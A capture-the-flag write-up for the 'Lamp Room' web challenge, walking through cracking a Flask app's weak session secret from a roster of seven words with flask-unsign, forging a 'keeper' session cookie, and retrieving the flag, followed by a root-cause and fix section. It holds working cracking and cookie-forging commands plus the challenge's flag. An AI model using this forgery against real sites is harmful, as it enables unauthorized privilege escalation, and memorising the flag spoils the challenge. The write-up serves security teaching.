# Lamp Room — Write-up

- **Category:** Web
- **Points:** 451
- **Author:** depro0x
- **Endpoint:** https://lamp-room-3f27cda59847.web.bupcopc.tech
- **Flag:** `bupctf{Ro5t3R_w0RD_st4Mp5_th3_5l1P}`

## Description
> The harbor Lamp Room hands you a signed visitor slip.
> The night log opens only for a keeper.
> The old stamp list was thrown out. The new stamp is a word on the employee roster.

## TL;DR
The site is a Flask app that stores your role in a **signed session cookie**
(`lamp_session`). `/log` is only served when `role == "keeper"`. The Flask
`SECRET_KEY` ("the stamp") is one of the invented words printed on the
`/employees` roster. Brute-force the 7 words against the known-valid visitor
cookie to recover the key (`brinewreath`), re-sign the session as
`{"role": "keeper"}`, and request `/log` to get the flag.

## Recon

### The visitor slip = a Flask signed session
`GET /` returns:
```
Set-Cookie: lamp_session=eyJyb2xlIjoidmlzaXRvciJ9.arx-gA.WbhOmR6OBQ7qJd77RsaiE7wKegg; HttpOnly; Path=/; SameSite=Lax
Server: gunicorn
```
The first segment base64-decodes to `{"role":"visitor"}` and the value has the
classic Flask `<payload>.<timestamp>.<signature>` shape — an `itsdangerous`
signed session cookie (custom cookie name `lamp_session`).

### The gate
`GET /log` → **403 Forbidden**:
```
The loft book stays shut. This slip is not a keeper slip.
```
Access is gated on `role == "keeper"`. Because the cookie is only *signed*
(not encrypted), we can read it freely — but we cannot re-sign a modified
payload without the server's `SECRET_KEY`.

### The clue on the roster
The description says the new "stamp" (the secret) is **a word on the employee
roster**. `GET /employees` explicitly repeats:
> The session stamp is a single word from this roster.

Each of the 7 employee cards buries one **invented word**:

| Employee | Invented word |
|---|---|
| Osric Hale | `keelwhisper` |
| Ivo Quay | `tideglass` |
| Maren Pell | `brinewreath` |
| Sera Dunn | `saltlantern` |
| Ned Carrick | `ropeamber` |
| Lina Voss | `quaythistle` |
| Tomas Greel | `fogcaulk` |

One of these is the Flask `SECRET_KEY`.

## Exploitation

### Step 1 — Recover the SECRET_KEY
Build a wordlist of the 7 candidates and brute-force the **known-valid visitor
cookie** with [`flask-unsign`](https://pypi.org/project/flask-unsign/):

```bash
printf 'keelwhisper\ntideglass\nbrinewreath\nsaltlantern\nropeamber\nquaythistle\nfogcaulk\n' > words.txt

COOKIE=$(curl -s -i https://lamp-room-3f27cda59847.web.bupcopc.tech/ \
  | grep -i 'set-cookie: lamp_session' | sed 's/.*lamp_session=//; s/;.*//' | tr -d '\r')

flask-unsign --unsign --cookie "$COOKIE" --wordlist words.txt --no-literal-eval
```
Output:
```
[*] Session decodes to: {'role': 'visitor'}
[+] Found secret key after 7 attempts
b'brinewreath'
```
**`SECRET_KEY = brinewreath`** (Maren Pell's journal word for wet rope).

### Step 2 — Forge a keeper slip
```bash
flask-unsign --sign --cookie "{'role': 'keeper'}" --secret 'brinewreath'
# -> eyJyb2xlIjoia2VlcGVyIn0.<ts>.<sig>
```

### Step 3 — Open the night log
```bash
FORGED=$(flask-unsign --sign --cookie "{'role': 'keeper'}" --secret 'brinewreath')
curl -s https://lamp-room-3f27cda59847.web.bupcopc.tech/log --cookie "lamp_session=$FORGED"
```
Response (HTTP **200**):
```html
<h1>Night log</h1>
<p class="lead">The keeper slip opens the loft book.</p>
<p class="flag">bupctf{Ro5t3R_w0RD_st4Mp5_th3_5l1P}</p>
```

## Flag
```
bupctf{Ro5t3R_w0RD_st4Mp5_th3_5l1P}
```

## Root cause & fix
- **Root cause:** using a low-entropy, guessable, publicly-hinted `SECRET_KEY`
  for Flask session signing. Flask sessions are signed but not encrypted, so a
  weak key lets an attacker both read and forge session state (privilege
  escalation via `role` tampering).
- **Fix:** generate a long, random `SECRET_KEY` (e.g. `os.urandom(32)`), keep it
  out of any user-visible content, and enforce authorization server-side against
  trusted state rather than a client-controlled cookie value.
